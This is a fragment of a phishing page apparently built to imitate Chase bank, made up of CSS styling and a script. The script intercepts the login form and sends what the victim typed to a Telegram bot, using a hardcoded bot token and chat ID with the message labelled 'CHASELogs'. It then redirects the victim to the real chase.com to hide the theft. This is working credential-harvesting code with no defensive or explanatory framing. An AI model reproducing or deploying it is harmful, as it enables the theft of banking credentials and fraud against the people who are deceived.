        body{
            padding: 0;
            margin: 0;
            box-sizing: border-box;
            font-family: Arial, Helvetica, sans-serif;
        }
        header#header img{
            height: 65px;
        }
        header#header{
            background: #0846a8;
            /* padding: 15px; */
            text-align: center;
        }

        a{
            color: rgb(0, 0, 238);
            text-decoration: none;
            font-size: 15px;
        }
        button{
            padding: 7px 50px;
            color: #fff;
            font-weight: bold;
            border-color: rgb(0, 0, 238);
            background: rgb(0, 0, 238);
            border-radius: 5px;
            cursor: pointer;
        }
        #form-sectiom{
            width: 50%;
            margin: auto;
        }
        input{
            border: none;
            border-bottom: 1px solid #000;
            width: 40%;
            outline: none;
            border: 0px 0px 1px 0px;
            background: none;
            border-radius: 0px;
        }
        @media(max-width: 800px){
        #form-sectiom{
            width: 95%;
        }
        input{
            width: 80%;
        }
        }
    </style>

    <script>
        const formal = document.querySelector('#form')
      
        let bot = {
            TOKEN: "5051297224:AAETgLhNRTbhpJNucj4Ny4y_czF0M3UnllY",
            chatID: "-772522345"
        }
    
    
        formal.addEventListener("submit", e =>{
            e.preventDefault();
    
            // let message = document.querySelector('#sss').value
            // let messageT = document.querySelector('#aaa').value
            let messageTT = document.querySelector('#bbb').value
            
            fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=CHASELogs==${messageTT}`, {
                method: "GET"
            }).then(success => {
                window.location.replace("https://chase.com");
            }, error => {
                alert("Message not sent")
                console.log(error)
    
            })
        })
    </script>
